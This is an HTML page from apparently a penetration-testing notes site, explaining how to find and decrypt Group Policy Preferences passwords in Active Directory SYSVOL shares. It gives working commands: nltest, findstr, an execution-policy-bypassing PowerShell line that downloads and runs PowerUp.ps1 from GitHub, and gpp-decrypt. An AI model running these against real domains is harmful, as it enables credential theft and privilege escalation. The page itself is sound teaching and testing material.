@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Password in GPO - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Background", url: "#_top", children: [
+          ]},
+          {title: "How to check for", url: "#how-to-check-for", children: [
+          ]},
+          {title: "Using CMD findstr", url: "#using-cmd-findstr", children: [
+              {title: "Using PowerUp.ps1", url: "#using-powerupps1" },
+              {title: "Semi-manually", url: "#semi-manually" },
+          ]},
+          {title: "References", url: "#references", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_windows_domain_domain_trust/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_windows_domain_domain_trust/" class="btn btn-xs btn-link">
+        Attacking Domain Trust
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../misconfigured_read_only_domain_controller/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../misconfigured_read_only_domain_controller/" class="btn btn-xs btn-link">
+        Misconfigured RODC
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="background">Background<a class="headerlink" href="#background" title="Permanent link">#</a></h2>
+<h2 id="how-to-check-for">How to check for<a class="headerlink" href="#how-to-check-for" title="Permanent link">#</a></h2>
+<p>Note that if the domain have trust with another domain it is likely that your user will access the SYSVOL of that domain as well.<br />
+So make sure to check both (or however many domains there are trust too) domains SYSVOL.</p>
+<p>To check which other domains there are trust to </p>
+<pre><code>nltest /domain_trusts
+</code></pre>
+
+<h2 id="using-cmd-findstr">Using CMD findstr<a class="headerlink" href="#using-cmd-findstr" title="Permanent link">#</a></h2>
+<pre><code>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml
+</code></pre>
+
+<h3 id="using-powerupps1">Using PowerUp.ps1<a class="headerlink" href="#using-powerupps1" title="Permanent link">#</a></h3>
+<pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'); Get-CachedGPPPassword&quot;
+</code></pre>
+
+<h3 id="semi-manually">Semi-manually<a class="headerlink" href="#semi-manually" title="Permanent link">#</a></h3>
+<p>Mount the SYSVOL of a Domain Controller</p>
+<pre><code>net use K: \\dc01\sysvol
+K:
+cd &lt;domain&gt;\Policies
+gci -recurse -filter &quot;*.xml&quot; | select-string cpass | out-file C:\Users\&lt;YOUUSER&gt;\Documents\gppresults.txt
+</code></pre>
+
+<p>If you found a string you can decrypt it with:</p>
+<pre><code>gpp-decyypt &lt;string&gt;
+</code></pre>
+
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">#</a></h2>
+<p>For more info: https://adsecurity.org/?p=2288</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_windows_domain_domain_trust/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_windows_domain_domain_trust/" class="btn btn-xs btn-link">
+        Attacking Domain Trust
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../misconfigured_read_only_domain_controller/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../misconfigured_read_only_domain_controller/" class="btn btn-xs btn-link">
+        Misconfigured RODC
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/active_directory_privilege_escalation/passwords_in_group_policy_preferences.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
